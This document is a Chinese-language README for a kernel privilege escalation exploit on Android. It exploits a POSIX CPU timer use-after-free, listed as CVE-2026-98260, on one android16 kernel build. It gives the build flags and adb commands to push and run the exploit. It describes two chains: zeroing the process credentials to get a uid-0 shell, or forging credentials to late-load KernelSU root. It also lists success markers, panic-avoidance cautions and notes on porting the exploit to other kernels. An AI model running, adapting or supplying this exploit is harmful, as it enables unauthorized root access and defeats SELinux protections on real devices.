# CVE-2026-98260 Timer LPE

`6.12.69-android16-6-g242e1a07f878` 的 CVE-2026-98260 POSIX CPU timer UAF 移植

两条链：

- `timer`：真实 cred 零写 → `uid=0`、`u:r:shell:s0`（shell 域 root，bset caps）
- `timer fake`：fake cred（full caps）→ 安装版 KernelSU `libksud.so` late-load

## 状态

| 路径                                     | 结果                                                              |
| ---------------------------------------- | ----------------------------------------------------------------- |
| real cred 零写 + `setuid(0)` + `exec sh` | `uid=0`、`u:r:shell:s0`、`ROOT_SHELL_OK`                          |
| fake cred + `ksud late-load`             | 安装版 `libksud.so`（uapi 6）、`KSU_LOADED`、`su` 为 `u:r:ksu:s0` |

## 环境

- 启动身份：adb/shell（uid 2000，`u:r:shell:s0`），可读 tracefs 与 `/proc/slabinfo`
- KernelSU manager 已安装（`me.weishu.kernelsu`）时，`fake` 会自动使用其 `lib/arm64/libksud.so`

## 构建

NDK 28.2（aarch64，API 35）：

```sh
cd timer
NDK=~/Android/Sdk/ndk/28.2.13676358/toolchains/llvm/prebuilt/linux-x86_64/bin
$NDK/aarch64-linux-android35-clang -O2 -std=gnu11 -static \
    -fno-stack-protector -fno-pic -I. \
    -ffunction-sections -fdata-sections timer.c -o timer \
    -Wl,--gc-sections -Wl,-s -Wl,--build-id=none \
    -Wl,-z,norelro -pthread
```

## 使用

```sh
adb push timer /data/local/tmp/timer
adb shell chmod 755 /data/local/tmp/timer

# 诊断
adb shell /data/local/tmp/timer ids     # 探测 tracefs page event id
adb shell /data/local/tmp/timer leak    # 只做 base/cred/task 泄漏，不触发 UAF

# uid-0 shell（真实 cred）
adb shell /data/local/tmp/timer         # id + context + ROOT_SHELL_OK
adb shell /data/local/tmp/timer shell   # 交互 sh

# KernelSU（fake cred + 安装版 ksud）
adb shell 'cd /data/local/tmp && setsid ./timer fake >timer.log 2>&1 </dev/null &'
adb shell cat /data/local/tmp/timer.log
```

`fake` 成功标志：

```text
[ksu] ksud=.../lib/arm64/libksud.so version=ksud 3.3.1-24-g528bafc5 (uapi: 6)
KSU_LOADED
kernelsu ... Live
```

```sh
adb shell /system/bin/su -c id   # uid=0 ... context=u:r:ksu:s0
```

## 安全

- 失败 state 会 **park 并持有 zombie**；不要 kill，重启是唯一安全清理
- `fake` 成功后父进程也会 park，用 socket 持有 fake cred 页
- 触发 UAF 后不要对 parked 进程 `timeout`/`kill`，否则 init 回收 stale node 可能 panic
- 硬重启后 ksu root 消失，使用 KernelSU 模拟软重启不会导致 ksu root 消失

## 目录

```text
timer/timer.c      exploit
timer/timer        静态产物
tools/*.c          移植诊断源码
```

## 目标与移植

关键常量写死在 `timer/timer.c`：`do_timer_create`/`copy_process` 站点、`selinux_state`、`panic_on_warn`、`copy_process` task cache 大小、`init_*` 符号

换内核时用设备的 boot.img/BTF/kallsyms 重新推导；`tools/` 下的文件用于核对 call site、raw record、timer 泄漏与 8 KiB AF_UNIX 回收通道

## 参考

- `woshigenm/CVE-2026-98260`（MIT）：trigger、real-cred 零写、fake cred/KSU 思路
- `ghostlock-app`：KernelSU late-load 最终阶段
- 其他 CVE-2026-98260 移植项目：order-1 回收与触发时序
